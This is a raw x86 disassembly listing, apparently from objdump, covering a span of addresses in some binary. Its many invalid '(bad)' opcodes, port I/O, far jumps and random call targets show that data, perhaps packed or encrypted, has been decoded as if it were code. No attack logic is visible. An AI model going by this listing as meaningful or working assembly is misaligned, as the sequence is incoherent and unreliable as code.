  421f1b:	scas   al,BYTE PTR es:[edi]
  421f1c:	mov    ebp,0xf1d3e6d2
  421f21:	out    0xf1,al
  421f23:	test   ah,0xf5
  421f26:	mov    eax,0xcfeffced
  421f2b:	(bad)  
  421f2c:	call   0xe145fc2f
  421f31:	loopne 0x421ef9
  421f33:	fistp  QWORD PTR [esi+0xfedf404]
  421f39:	push   es
  421f3a:	icebp  
  421f3b:	fnstcw WORD PTR [eax-0x243d3830]
  421f41:	mov    dh,0xa8
  421f43:	out    0xf1,eax
  421f45:	out    0xf8,eax
  421f47:	mov    ecx,0xd6c3cdc4
  421f4c:	rcl    bh,0xd4
  421f4f:	icebp  
  421f50:	(bad)  
  421f51:	(bad)  
  421f52:	loope  0x421f39
  421f54:	ror    edx,0xc4
  421f57:	fiadd  WORD PTR [esi]
  421f59:	adc    bl,dl
  421f5b:	fucomip st,st(7)
  421f5d:	mov    ebp,0xd0d0afaf
  421f62:	test   cl,0xe7
  421f65:	iret   
  421f66:	out    dx,eax
  421f67:	(bad)  
  421f68:	fcom   st(1)
  421f6a:	mov    al,0xc9
  421f6c:	in     al,dx
  421f6d:	out    dx,eax
  421f6e:	rol    BYTE PTR [esi],cl
  421f70:	add    esi,ecx
  421f72:	sti    
  421f73:	in     eax,0x9
  421f75:	retf   0xdbf6
  421f78:	add    al,0xcb
  421f7a:	jmp    0xeb35d12e
  421f7f:	div    ecx
  421f81:	jecxz  0x421f4f
  421f83:	repnz sar cl,0xcd
  421f87:	fmul   st(7),st
  421f89:	icebp  
  421f8a:	mov    edx,0xf6e2bf
  421f8f:	pop    es
  421f90:	jmp    0x421f68
  421f92:	(bad)  
  421f93:	fucomi st,st(2)
  421f95:	push   cs
  421f96:	or     BYTE PTR [ecx],cl
  421f98:	fcmove st,st(4)
  421f9a:	icebp  
  421f9b:	shl    dl,0xd6
  421f9e:	xlat   BYTE PTR ds:[ebx]
  421f9f:	loopne 0x421f56
  421fa1:	cmc    
  421fa2:	leave  
  421fa3:	leave  
  421fa4:	(bad)  
  421fa5:	rol    dh,1
  421fa7:	std    
  421fa8:	jmp    0x421f97
  421faa:	fcmovbe st,st(5)
  421fac:	icebp  
  421fad:	stc    
  421fae:	into   
  421faf:	fdivr  st,st(4)
  421fb1:	hlt    
  421fb2:	hlt    
  421fb3:	in     eax,0xe2
  421fb5:	loope  0x421f7e
  421fb7:	cli    
  421fb8:	aam    0x8
  421fba:	jmp    0xb230007e
  421fbf:	xlat   BYTE PTR ds:[ebx]
  421fc0:	div    DWORD PTR [ebp-0x1248480c]
  421fc6:	mov    ch,0xf9
  421fc8:	repnz icebp 
  421fca:	aam    0xce
  421fcc:	aam    0xbe
  421fce:	out    0xf9,eax
  421fd0:	rcl    cl,0xc6
  421fd3:	(bad)  
  421fd4:	fmulp  st(1),st
  421fd6:	fiadd  WORD PTR [edi]
  421fd8:	fcmovne st,st(1)
  421fda:	add    bh,BYTE PTR [esi-0x2c421e30]
  421fe0:	shl    DWORD PTR [edx-0x38264f1a],1
  421fe6:	lock mov edx,0xcdf7faf1
  421fec:	fcmovnu st,st(0)
  421fee:	pop    es
  421fef:	repnz in eax,0xdb
  421ff2:	hlt    
  421ff3:	hlt    
  421ff4:	ret    0xffcf
  421ff7:	bswap  ebp
  421ff9:	or     ebp,ebp
  421ffb:	retf   0xb7cc
  421ffe:	jecxz  0x421fee
  422000:	(bad)  
  422001:	fcomi  st,st(0)
  422003:	xlat   BYTE PTR ds:[ebx]
  422004:	(bad)  
  422005:	aad    0xf8
  422007:	aam    0xbc
  422009:	div    eax
  42200b:	cli    
  42200c:	repnz add ebx,ebx
  42200f:	out    0xfa,al
  422011:	rcr    bl,0xf1
  422014:	jmp    0xf2fd:0xfd5f504
  42201b:	enter  0xdeed,0xf2
  42201f:	(bad)  
  422020:	mov    cl,0xb5
  422022:	int3   
  422023:	fcomp  st(0)
  422025:	mov    edx,0xccbfdbf1
  42202a:	mov    esp,0xb8c7bdba
  42202f:	in     eax,dx
  422030:	test   DWORD PTR [edx],0xc505f509
  422036:	aad    0xdc
  422038:	fmul   st,st(5)
  42203a:	or     eax,eax
  42203c:	fdivr  st(1),st
  42203e:	mov    esi,0xb7ccc5d7
  422043:	mov    dh,0xd7
  422045:	out    0xf5,al
  422047:	(bad)  
  422048:	into   
  422049:	clc    
  42204a:	shl    bl,1
  42204c:	pop    es
  42204d:	loopne 0x422049
  42204f:	shl    esi,1
  422051:	loop   0x42202c
  422053:	cmc    
  422054:	dec    DWORD PTR [edi]
  422056:	add    al,BYTE PTR ds:0xf106dee6
  42205c:	mov    eax,0xced4c9bd
  422061:	loopne 0x42204b
  422063:	aam    0xd7
  422065:	mov    edi,0xbcd1d5c6
  42206a:	fadd   DWORD PTR [ecx]
  42206c:	lock shl ecx,cl
  42206f:	mov    ebp,0xdbe7f7e3
  422074:	xlat   BYTE PTR ds:[ebx]
  422075:	mul    dh
  422077:	fcomp  st(6)
  422079:	push   cs
  42207a:	iret   
  42207b:	retf   
  42207c:	int    0xef
  42207e:	in     eax,dx
  42207f:	(bad)  
  422081:	ret    
  422082:	(bad)
  422086:	(bad)  
  422087:	sti    
  422088:	retf   
  422089:	jmp    0xc41f1f88
  42208e:	in     al,dx
  42208f:	hlt    
  422090:	sar    BYTE PTR [ebp-0x5142821],cl
  422096:	loop   0x422062
  422098:	(bad)  
  422099:	in     al,0xe1
  42209b:	retf   
  42209c:	lods   eax,DWORD PTR ds:[esi]
  42209d:	fbstp  TBYTE PTR [ebx-0x19520c3f]
  4220a3:	sti    
  4220a4:	mov    dl,0xeb
  4220a6:	jmp    0xf4b8:0xf1b4b2e5
  4220ad:	iret   
  4220ae:	rcr    dl,cl
  4220b0:	mov    edx,0xe7e006e7
  4220b5:	(bad)  
  4220b6:	inc    ebp
  4220b8:	or     eax,0xe6d9cde3
  4220bd:	ret    
  4220be:	in     al,dx
  4220bf:	ret    0xe7c1
  4220c2:	icebp  
  4220c3:	enter  0xb6db,0xd5
  4220c7:	retf   0xf1d8
  4220ca:	mov    edx,0xf1feb601
  4220cf:	rcl    ecx,0xcb
  4220d2:	rcl    ecx,0xf8
  4220d5:	clc    
  4220d6:	jmp    0xa21fda8
  4220db:	mov    ecx,0xe5c0c9ec
  4220e0:	enter  0xcfc5,0xe8
  4220e4:	mov    dl,0xf3
  4220e6:	retf   
  4220e7:	rcl    cl,cl
  4220e9:	(bad)  
  4220eb:	mov    edx,0x505e2ec
  4220f0:	fucomp st(2)
  4220f2:	loop   0x4220f1
  4220f4:	or     edi,ebx
  4220f6:	aad    0xd8
  4220f8:	jmp    ebx
  4220fa:	loope  0x4220bb
  4220fc:	retf   
  4220fd:	loop   0x4220e6
  4220ff:	ret    
  422100:	xlat   BYTE PTR ds:[ebx]
  422101:	leave  
  422102:	fnop   
  422104:	iret   
  422105:	mov    ebx,0xcecbfedd
  42210a:	out    dx,al
  42210b:	icebp  
  42210c:	pop    es
  42210d:	mov    ebp,0xc301bed4
  422112:	rcr    bl,1
  422114:	leave  
  422115:	cli    
  422116:	mov    ebx,0xdeeadf05
  42211c:	iret   
  42211d:	scas   al,BYTE PTR es:[edi]
  42211e:	rol    bh,cl
  422120:	aam    0xea
  422122:	mov    al,0xb3
  422124:	les    edi,FWORD PTR [ecx-0x2f0a1130]
  42212a:	dec    ebp
  42212c:	shl    edx,cl
  42212e:	hlt    
  42212f:	repz int3 
  422131:	aam    0xf9
  422133:	(bad)  
  422135:	in     al,0xc9
  422137:	fisttp QWORD PTR ds:0xecbdf9fa
  42213d:	out    dx,al
  42213e:	mov    bh,0xf1
  422140:	shl    DWORD PTR [ebp-0x26122d2c],0xf4
  422147:	into   
  422148:	retf   0xc2d1
  42214b:	mov    eax,0xd0f4ded0
  422150:	shl    ecx,1
  422152:	(bad)  
  422154:	fadd   st(1),st
  422156:	clc    
  422157:	enter  0xffd9,0xdd
  42215b:	call   0xbe290821
  422160:	(bad)
  422163:	retf   
  422164:	clc    
  422165:	cli    
  422166:	leave  
  422167:	out    dx,eax
  422168:	jmp    0x422164
  42216a:	(bad)  
  42216c:	in     eax,dx
  42216d:	out    dx,eax
  42216e:	cmc    
  42216f:	loop   0x422155
  422171:	shl    ch,0xc1
  422174:	aad    0x2
  422176:	jecxz  0x422160
  422178:	std    
  422179:	add    dh,cl
  42217b:	shl    DWORD PTR [esi-0x51435351],0xe5
  422182:	aam    0xb9
  422184:	rcl    ah,0xf4
  422187:	mov    ah,0xfc
  422189:	repnz in eax,dx
  42218b:	ret    0xd9bf
  42218e:	out    0xd2,al
  422190:	(bad)
  422193:	ret    0xfff8
  422196:	out    0xea,eax
  422198:	fadd   st,st(5)
  42219a:	jmp    0xc326ef52
  42219f:	(bad)
  4221a2:	(bad)  
  4221a3:	cmc    
  4221a4:	(bad)  
  4221a5:	xlat   BYTE PTR ds:[ebx]
  4221a6:	ror    ebp,cl
  4221a8:	in     al,dx
  4221a9:	repz iret 
  4221ab:	(bad)  
  4221ad:	mov    esp,0xc6cccce0
  4221b2:	stc    
  4221b3:	(bad)  
  4221b5:	mov    ebp,0xc4cbdb0d
  4221ba:	or     al,0xed
  4221bc:	out    dx,al
  4221bd:	mov    esi,0xf4e9f6c2
  4221c2:	(bad)  
  4221c3:	jmp    0xdb03:0xdfc4f4c4
  4221ca:	stc    
  4221cb:	std    
  4221cc:	fcmovu st,st(7)
  4221ce:	shl    ah,cl
  4221d0:	cmc    
  4221d1:	add    edx,ebx
  4221d3:	in     al,0xc5
  4221d5:	in     eax,0xf6
  4221d7:	(bad)  
  4221d9:	or     bh,ah
  4221db:	loopne 0x42219f
  4221dd:	repz in eax,dx
  4221df:	shl    al,cl
  4221e1:	mov    dh,0xf4
  4221e3:	rcl    cl,cl
  4221e5:	into   
  4221e6:	(bad)  
  4221e8:	cld    
  4221e9:	cli    
  4221ea:	mov    esp,0xe5f5ce01
  4221ef:	cli    
  4221f0:	aam    0xd0
  4221f2:	(bad)
  4221f5:	out    0xc5,eax
  4221f7:	cld    
  4221f8:	loop   0x422206
  4221fa:	adc    ebp,edi
  4221fc:	call   0xd836d8ee
  422201:	into   
  422202:	mov    dh,0xd9
  422204:	in     al,dx
  422205:	shl    ah,1
  422207:	retf   
  422208:	mov    ebx,0xf9fdf2db
  42220d:	(bad)  
  42220f:	loope  0x4221d5
  422211:	ret    0xc0db
  422214:	aam    0xe7
  422216:	jecxz  0x422225
  422218:	jmp    0xcac1:0xbddd1207
  42221f:	repz repz (bad) 
  422222:	jmp    0xfc111cf5
  422227:	stc    
  422228:	mov    dh,0x2
  42222a:	int3   
  42222b:	rcr    edi,0xbc
  42222e:	mov    edi,0x9b9c4d6
  422233:	rcl    edi,0xc9
  422236:	aad    0xe1
  422238:	out    0xe2,eax
  42223a:	loopne 0x4221e3
  42223c:	lods   al,BYTE PTR ds:[esi]
  42223d:	in     eax,dx
  42223e:	repnz hlt 
  422240:	loop   0x422238
  422242:	loope  0x422229
  422244:	in     eax,0xc7
  422246:	(bad)  
  422248:	fsubr  st,st(3)
  42224a:	ret    
  42224b:	mov    ecx,0xdff7f8c1
  422250:	out    0xdc,al
  422252:	add    ecx,ecx
  422254:	cli    
  422255:	iret   
  422256:	cmc    
  422257:	int    0xdf
  422259:	fstp   st(1)
  42225b:	call   0xf02af353
  422260:	out    0xd7,al
  422262:	repnz loope 0x422225
  422265:	rcr    eax,cl
  422267:	mov    dh,0xf5
  422269:	stc    
  42226a:	sar    cl,1
  42226c:	rcr    al,0xd6
  42226f:	add    al,0xfc
  422271:	fcmove st,st(2)
  422273:	call   esi
  422275:	fcomp  st(2)
  422277:	jmp    0xba3bef66
  42227c:	out    dx,al
  42227d:	iret   
  42227e:	into   
  42227f:	mov    esp,0xe1f0d0e6
  422284:	(bad)  
  422285:	xlat   BYTE PTR ds:[ebx]
  422286:	mov    eax,0xe3bad0b7
  42228b:	aad    0xf6
  42228d:	fnstcw WORD PTR [esi+edi*8-0x81b260a]
  422294:	add    eax,0xcedcdec4
  422299:	dec    BYTE PTR [ebx]
  42229b:	shr    bh,0xec
  42229e:	jmp    0xb5e0:0xe2e5dbd6
  4222a5:	clc    
  4222a6:	fcmovne st,st(1)
  4222a8:	shr    esp,1
  4222aa:	mov    al,0xdd
  4222ac:	repz out 0xdb,al
  4222af:	add    dh,dh
  4222b1:	lock fdivp st(6),st
  4222b4:	fucomi st,st(0)
  4222b6:	(bad)  [edi]
  4222b8:	(bad)  
  4222ba:	iret   
  4222bb:	int3   
  4222bc:	into   
  4222bd:	shr    DWORD PTR [eax-0x16121a3c],1
  4222c3:	(bad)  
  4222c4:	idiv   edi
  4222c6:	rcr    cl,cl
  4222c8:	(bad)  
  4222c9:	repnz retf 0xd000
  4222cd:	(bad)  
  4222ce:	fdiv   st,st(0)
  4222d0:	(bad)  
  4222d1:	hlt    
  4222d2:	fstp   st(3)
  4222d4:	loopne 0x4222b4
  4222d6:	loope  0x4222d9
  4222d8:	in     eax,dx
  4222d9:	iret   
  4222da:	loop   0x4222a0
  4222dc:	in     al,0xb2
  4222de:	loope  0x4222ce
  4222e0:	in     eax,dx
  4222e1:	rcr    bl,0xb6
  4222e4:	leave  
  4222e5:	mov    cl,0xd9
  4222e7:	leave  
  4222e8:	fstp   TBYTE PTR [esi-0x21fc0a2d]
  4222ee:	icebp  
  4222ef:	fcmovnu st,st(4)
  4222f1:	cld    
  4222f2:	std    
  4222f3:	fcmovbe st,st(5)
  4222f5:	jecxz  0x4222b7
  4222f7:	enter  0xca08,0xff
  4222fb:	jmp    0xaf0fcfcc
  422300:	leave  
  422301:	in     al,dx
  422302:	repnz into 
  422304:	repnz mov ebx,0xd7e8f8ee
  42230a:	int3   
  42230b:	clc    
  42230c:	cld    
  42230d:	mov    esi,0xdae4c0d0
  422312:	test   DWORD PTR [edx],0xdfead8e6
  422318:	pop    es
  422319:	add    cl,ch
  42231b:	ffree  st(0)
  42231d:	in     eax,0xc7
  42231f:	scas   al,BYTE PTR es:[edi]
  422320:	out    dx,al
  422321:	repz jmp 0xcdc8:0xc8b0dbc4
  422329:	cli    
  42232a:	fsubp  st(4),st
  42232c:	repnz icebp 
  42232e:	in     al,dx
  42232f:	cld    
  422330:	cli    
  422331:	ret    
  422332:	sar    BYTE PTR [edi-0x250a1915],1
  422338:	hlt    
  422339:	adc    cl,dl
  42233b:	loope  0x4222ef
  42233d:	out    0xc3,eax
  42233f:	icebp  
  422340:	imul   al
  422342:	out    0xf7,eax
  422344:	hlt    
  422345:	mov    ebx,0xd4f5d4ed
  42234a:	mov    edi,0xe203d1f5
  42234f:	jecxz  0x422331
  422351:	out    0xfa,al
  422353:	aam    0xc1
  422355:	stc    
  422356:	vmload 
  422359:	out    0xc,eax
  42235b:	out    dx,al
  42235c:	ret    
  42235d:	mov    esp,0xd0cef4cd
  422362:	out    dx,al
  422363:	mov    ah,0xd3
  422365:	idiv   BYTE PTR [eax-0xb433b10]
  42236b:	loope  0x42233e
  42236d:	stc    
  42236e:	fstp   st(2)
  422370:	(bad)  
  422371:	sti    
  422372:	shl    bl,0x7
  422375:	pop    es
  422376:	fucomi st,st(7)
  422378:	loope  0x422372
  42237a:	jmp    0xb7c4:0xdedcecca
  422381:	loop   0x422343
  422383:	fcmovu st,st(1)
  422385:	shl    dh,cl
  422387:	retf   0xd0b8
  42238a:	fiadd  WORD PTR [ebx]
  42238c:	aam    0xdb
  42238e:	icebp  
  42238f:	jecxz  0x422358
  422391:	cmc    
  422392:	clc    
  422393:	sti    
  422394:	(bad)  
  422395:	jmp    0xb913:0xcbe7c6c6
  42239c:	lods   al,BYTE PTR ds:[esi]
  42239d:	icebp  
  42239e:	cmc    
  42239f:	aam    0xf0
  4223a1:	rcl    edi,cl
  4223a3:	mov    al,0xf8
  4223a5:	lock jmp 0xb13bf8a7
  4223ab:	mov    esp,0xc0c000fd
  4223b0:	hlt    
  4223b1:	shl    ch,cl
  4223b3:	rcr    ah,0xe9
  4223b6:	enter  0xfbc4,0xce
  4223ba:	fisubr WORD PTR [edx-0x1550400e]
  4223c0:	hlt    
  4223c1:	sti    
  4223c2:	(bad)  
  4223c3:	icebp  
  4223c4:	shl    al,1
  4223c6:	sti    
  4223c7:	fcmove st,st(5)
  4223c9:	call   0xc0ff1bb7
  4223ce:	(bad)  
  4223d0:	mov    esi,0xdae1c4f9
  4223d5:	add    al,0xe2
  4223d7:	retf   0xc5
  4223da:	bnd jmp 0x4223a4
  4223dd:	lods   al,BYTE PTR ds:[esi]
  4223de:	out    0xc6,eax
  4223e0:	div    DWORD PTR [ecx-0x3637353c]
  4223e6:	std    
  4223e7:	sar    ecx,cl
  4223e9:	repz leave 
  4223eb:	loop   0x4223cc
  4223ed:	fcomi  st,st(3)
  4223ef:	(bad)  
  4223f1:	ret    0xdae5
  4223f4:	jmp    0x4223f0
  4223f6:	out    0xd8,al
  4223f8:	fiadd  DWORD PTR ds:0xbcdeecd3
  4223fe:	(bad)
  422402:	loop   0x4223d2
  422404:	(bad)  
  422406:	fst    st(3)
  422408:	(bad)  
  422409:	mov    ebx,0xf9faddbf
  42240e:	add    ebx,ebx
  422410:	in     al,dx
  422411:	mov    esp,0x8f8d0dd
  422416:	leave  
  422417:	iret   
  422418:	repz fmul QWORD PTR [edi]
  42241b:	in     al,0xdc
  42241d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42241e:	mov    dl,0xf1
  422420:	shl    BYTE PTR [eax-0x4b2c150a],0xb9
  422427:	jmp    0xffdd:0xe003eecc
  42242e:	add    esi,esp
  422430:	(bad)  
  422431:	ret    0xc2e5
  422434:	jmp    0x506:0xf90bdfe6
  42243b:	mov    edi,0xb6b3ccdc
  422440:	aad    0xe9
  422442:	jmp    0xd9160b39
  422447:	repnz fyl2xp1 
  42244a:	div    eax
  42244c:	clc    
  42244d:	(bad)  
  42244e:	mov    eax,0xc5c705e5
  422453:	rol    DWORD PTR [edx],1
  422455:	or     bl,bh
  422457:	stc    
  422458:	ret    0xd2e3
  42245b:	iret   
  42245c:	mov    dl,0xe0
  42245e:	(bad)  
  42245f:	fsubr  st(2),st
  422461:	ror    bl,0xc0
  422464:	push   DWORD PTR [ecx-0xb12154c]
  42246a:	mov    ah,0xe1
  42246c:	ret    0xe6cc
  42246f:	add    eax,0xc5e2e3e3
  422474:	add    al,0x8
  422476:	aam    0xd8
  422478:	or     al,0x4
  42247a:	fsubrp st(5),st
  42247c:	mov    esp,0xbcdcacc6
  422481:	fidiv  DWORD PTR [esi-0x13053018]
  422487:	icebp  
  422488:	clc    
  422489:	iret   
  42248a:	jmp    0xbedf:0x1d503c9
  422491:	fdivr  st,st(5)
  422493:	or     esp,ebp
  422495:	test   BYTE PTR [edi],0xe
  422498:	out    0xfe,al
  42249a:	clc    
  42249b:	int    0xe2
  42249d:	ret    0xefbc
  4224a0:	rcl    eax,1
  4224a2:	int    0xf8
  4224a4:	cmc    
  4224a5:	mov    ebx,0xf8fbccfb
  4224aa:	mov    edx,0xd7f6b6c9
  4224af:	fadd   st(2),st
  4224b1:	fsub   st,st(4)
  4224b3:	hlt    
  4224b4:	(bad)  
  4224b5:	out    dx,al
  4224b6:	mov    esp,0x9ccc6e2
  4224bb:	stos   BYTE PTR es:[edi],al
  4224bc:	sar    BYTE PTR [ebp-0x1d0c511f],1
  4224c2:	int3   
  4224c3:	fcos   
  4224c5:	icebp  
  4224c6:	clc    
  4224c7:	repz icebp 
  4224c9:	out    dx,al
  4224ca:	test   esi,0xc2f2dbfc
  4224d0:	lock idiv ah
  4224d3:	fcmove st,st(1)
  4224d5:	(bad)  
  4224d7:	faddp  st(4),st
  4224d9:	add    al,0xda
  4224db:	fld    st(6)
  4224dd:	out    0xe3,eax
  4224df:	test   ah,0xcb
  4224e2:	in     al,dx
  4224e3:	xlat   BYTE PTR ds:[ebx]
  4224e4:	(bad)  
  4224e5:	hlt    
  4224e6:	std    
  4224e7:	clc    
  4224e8:	jmp    0xe01b21da
  4224ed:	mov    eax,0xd5ecc2f5
  4224f2:	aad    0xdd
  4224f4:	add    esp,edx
  4224f6:	sti    
  4224f7:	in     al,0xe9
  4224f9:	fmul   st,st(6)
  4224fb:	jmp    0xf50f0fd0
  422500:	out    dx,al
  422501:	loope  0x4224c5
  422503:	stc    
  422504:	int    0xca
  422506:	jmp    0xed2b02c9
  42250b:	mov    esp,0xec00fad9
  422510:	cmc    
  422511:	shr    bl,1
  422513:	mov    edi,0xe4f906dc
  422518:	sti    
  422519:	out    0xca,eax
  42251b:	mov    esp,0xf6b6e2c2
  422520:	retf   
  422521:	call   0xea07fc01
  422526:	lock aad 0xfe
  422529:	mov    edi,0xd2cfdeed
  42252e:	shl    edi,cl
  422530:	(bad)  
  422531:	call   edx
  422533:	std    
  422534:	add    ch,al
  422536:	pop    es
  422537:	fnclex 
  422539:	add    edx,edi
  42253b:	lods   eax,DWORD PTR ds:[esi]
  42253c:	call   0xae351c2d
  422541:	mov    dl,0xb5
  422543:	sti    
  422544:	call   0xdf26df01
  422549:	fcmove st,st(6)
  42254b:	ror    edi,0xd0
  42254e:	out    0xe2,al
  422550:	ret    
  422551:	mov    ebp,0xe1fbe20a
  422556:	(bad)  
  422557:	call   0xa920386f
  42255c:	mov    eax,0xc5e6e1c5
  422561:	aad    0xeb
  422563:	leave  
  422564:	jmp    0x42251a
  422566:	icebp  
  422567:	push   eax
  422569:	stc    
  42256a:	fsubp  st(5),st
  42256c:	(bad)  
  42256d:	aad    0xd0
  42256f:	sti    
  422570:	stc    
  422571:	ret    0xe4f8
  422574:	or     eax,eax
  422576:	call   0xdd2e0b3e
  42257b:	repnz loopne 0x42255f
  42257e:	lods   eax,DWORD PTR ds:[esi]
  42257f:	mov    cl,0xd1
  422581:	imul   ebp
  422583:	div    bl
  422585:	out    0xc5,al
  422587:	fmul   st(4),st
  422589:	shl    DWORD PTR [edx+eax*1-0xfe2743],cl
  422590:	jecxz  0x422595
  422592:	ret    
  422593:	pop    es
  422594:	loopne 0x422596
  422596:	stc    
  422597:	aam    0xde
  422599:	loop   0x42258a
  42259b:	mov    ebp,0xf5eaf1bd
  4225a0:	int    0xfa
  4225a2:	(bad)  
  4225a3:	jmp    0xd1fa:0xcdc6d5ff
  4225aa:	fsub   st(4),st
  4225ac:	fdiv   st(0),st
  4225ae:	icebp  
  4225af:	add    ah,dh
  4225b1:	in     eax,0xca
  4225b3:	dec    BYTE PTR [edx]
  4225b5:	add    ecx,ebx
  4225b7:	or     ebp,ebp
  4225b9:	ror    DWORD PTR [ebx],cl
  4225bb:	(bad)  
  4225bc:	repz shl DWORD PTR [esi-0x1e444d37],0xba
  4225c4:	repz out dx,eax
  4225c6:	icebp  
  4225c7:	mov    ebx,0xcce9f7fe
  4225cc:	in     al,dx
  4225cd:	sti    
  4225ce:	rol    dl,1
  4225d0:	repnz (bad) 
  4225d3:	call   0x4251ad7
  4225d8:	(bad)  
  4225d9:	push   cs
  4225da:	adc    edx,edx
  4225dc:	jecxz  0x4225c1
  4225de:	in     eax,0xc9
  4225e0:	mov    dh,0xbb
  4225e2:	mov    al,0xb3
  4225e4:	(bad)  
  4225e6:	mov    ebx,0xf0ecd8b8
  4225eb:	mov    ebx,0xd4d9d1d9
  4225f0:	stc    
  4225f1:	cld    
  4225f2:	(bad)  
  4225f3:	call   0xdf2725d6
  4225f8:	add    DWORD PTR [ebx],edx
  4225fa:	retf   
  4225fb:	shl    ebp,0xe2
  4225fe:	ror    ah,cl
  422600:	mov    dh,0xb4
  422602:	ror    esp,1
  422604:	mov    dh,0xce
  422606:	retf   0xf1da
  422609:	mov    ah,0xf9
  42260b:	iret   
  42260c:	repnz add edx,ebx
  42260f:	(bad)  
  422610:	fsub   st,st(6)
  422612:	out    0xca,eax
  422614:	hlt    
  422615:	fdivr  st,st(2)
  422617:	loopne 0x422622
  422619:	(bad)  
  42261a:	jmp    DWORD PTR [edi-0x2e1f3c50]
  422620:	mov    bh,0xb5
  422622:	leave  
  422623:	(bad)  
  422624:	mov    cl,0xc4
  422626:	idiv   esp
  422628:	fcom   st(6)
  42262a:	int    0xcc
  42262c:	loope  0x4225ee
  42262e:	test   DWORD PTR [edi],0xe6f7dcc1
  422634:	fdiv   st(4),st
  422636:	leave  
  422637:	jmp    0x422639
  422639:	sar    ecx,cl
  42263b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42263c:	test   al,0xe0
  42263e:	(bad)  
  42263f:	lods   al,BYTE PTR ds:[esi]
  422640:	cmc    
  422641:	out    0xc8,al
  422643:	stc    
  422644:	(bad)  
  422645:	cli    
  422646:	icebp  
  422647:	mov    bl,0xf7
  422649:	idiv   ebp
  42264b:	cld    
  42264c:	xlat   BYTE PTR ds:[ebx]
  42264d:	into   
  42264e:	xlat   BYTE PTR ds:[ebx]
  42264f:	(bad)  
  422651:	aam    0x4
  422653:	clc    
  422654:	out    0xc0,al
  422656:	jmp    0x42262d
  422658:	lds    eax,FWORD PTR [eax]
  42265a:	adc    ebp,DWORD PTR [ebp-0x372c172e]
  422660:	jecxz  0x42262e
  422662:	mov    bl,0xb4
  422664:	enter  0xd3b0,0xeb
  422668:	fucomi st,st(6)
  42266a:	int3   
  42266b:	std    
  42266c:	cld    
  42266d:	add    ecx,esp
  42266f:	(bad)  
  422670:	(bad)  
  422672:	fcmovnu st,st(5)
  422674:	push   es
  422675:	push   es
  422676:	in     eax,0xc3
  422678:	call   0xb011005a
  42267d:	jmp    0xdbd1:0xc0e1e5ea
  422684:	shr    ch,cl
  422686:	sti    
  422687:	fucomip st,st(6)
  422689:	ret    
  42268a:	stc    
  42268b:	add    bh,ah
  42268d:	jecxz  0x422652
  42268f:	fild   DWORD PTR [edi]
  422691:	fprem1 
  422693:	fsubr  st(6),st
  422695:	iret   
  422696:	std    
  422697:	int    0xf8
  422699:	jmp    0xf2d7:0xcaacbee1
  4226a0:	in     eax,dx
  4226a1:	iret   
  4226a2:	cmc    
  4226a3:	mov    dl,0xda
  4226a5:	aam    0xcb
  4226a7:	(bad)  
  4226a8:	mov    ecx,0xcdf5bfb1
  4226ad:	aad    0xd9
  4226af:	stc    
  4226b0:	out    0xf3,al
  4226b2:	fsub   st,st(2)
  4226b4:	add    eax,0xcfce030b
  4226b9:	out    0x11,eax
  4226bb:	leave  
  4226bc:	shl    edx,1
  4226be:	jmp    0xb7f6:0xc7d2d2e2
  4226c5:	xlat   BYTE PTR ds:[ebx]
  4226c6:	(bad)  
  4226c8:	mov    ebp,0x2d5b0f1
  4226cd:	in     eax,dx
  4226ce:	rcl    ch,0xd0
  4226d1:	in     eax,0xfd
  4226d3:	(bad)  
  4226d4:	inc    BYTE PTR [edi]
  4226d6:	jmp    0xc2528c2
  4226db:	icebp  
  4226dc:	mov    bl,0xd3
  4226de:	jmp    0xe9ef:0xbbd3b6d0
  4226e5:	in     al,dx
  4226e6:	jmp    0xd2bc:0xe8d9cabd
  4226ed:	rcl    esi,0xf4
  4226f0:	rol    DWORD PTR [ebx],0xc3
  4226f3:	add    eax,0x7ee0ae9
  4226f8:	hlt    
  4226f9:	leave  
  4226fa:	or     cl,ah
  4226fc:	mov    edi,0xd2e0c2c2
  422701:	repnz mov bh,0xe0
  422704:	(bad)  
  422705:	shl    edi,cl
  422707:	mov    esi,0xf9f5deb9
  42270c:	cmc    
  42270d:	(bad)  
  42270e:	not    ch
  422710:	mov    ebp,0xc1c0d0d5
  422715:	cld    
  422716:	iret   
  422717:	add    al,BYTE PTR [edx]
  422719:	jecxz  0x422721
  42271b:	mov    dl,0xb0
  42271d:	test   al,0xeb
  42271f:	aam    0xb5
  422721:	mov    ecx,0xb5bffae8
  422727:	hlt    
  422728:	mov    edx,0xf9ece3ba
  42272d:	std    
  42272e:	out    0xd7,al
  422730:	not    edx
  422732:	out    0xc7,eax
  422734:	fsub   st(7),st
  422736:	push   es
  422737:	push   ebx
  422739:	leave  
  42273a:	or     al,0xab
  42273c:	lock repnz int 0xc5
  422740:	(bad)
  422743:	mov    edx,0xcad5f9d5
  422748:	in     al,dx
  422749:	std    
  42274a:	iret   
  42274b:	clc    
  42274c:	iret   
  42274d:	(bad)  
  42274e:	out    dx,al
  42274f:	shl    dl,cl
  422751:	(bad)  
  422752:	jmp    0x422732
  422754:	add    ebp,edx
  422756:	call   0xa46f421
  42275b:	rcr    dh,0xee
  42275e:	mov    cl,0xb3
  422760:	icebp  
  422761:	mov    dh,0xa8
  422763:	aad    0xda
  422765:	repnz in eax,dx
  422767:	cld    
  422768:	(bad)  
  422769:	cli    
  42276a:	sar    al,1
  42276c:	out    dx,eax
  42276d:	aam    0xc7
  42276f:	rcl    ah,0xc7
  422772:	fcmovnb st,st(5)
  422774:	jmp    esp
  422776:	(bad)  
  422777:	or     esp,edi
  422779:	add    ebx,esi
  42277b:	out    0xb1,eax
  42277d:	loopne 0x422745
  42277f:	into   
  422780:	ret    0xe1ea
  422783:	out    dx,eax
  422784:	mov    ah,0xe4
  422786:	lds    edi,FWORD PTR [esi-0x71c472f]
  42278c:	mov    ebp,0xd2e2ccd6
  422791:	mov    esp,0xddcafec0
  422796:	out    dx,eax
  422797:	add    al,0x2
  422799:	in     eax,0xc
  42279b:	mov    edi,0xf2e9e8e1
  4227a0:	loopne 0x422776
  4227a2:	mov    dh,0xf2
  4227a4:	mov    edx,0xdfe5f3b6
  4227a9:	repnz loope 0x42278a
  4227ac:	fcomp  st(0)
  4227ae:	fldln2 
  4227b0:	icebp  
  4227b1:	in     al,0xe0
  4227b3:	aad    0x8
  4227b5:	add    eax,0xede40fc5
  4227ba:	repnz mov cl,0xc2
  4227bd:	mov    bh,0xd1
  4227bf:	int    0xe1
  4227c1:	jmp    0xccd9:0xcdcfdbbb
  4227c8:	idiv   bl
  4227ca:	cld    
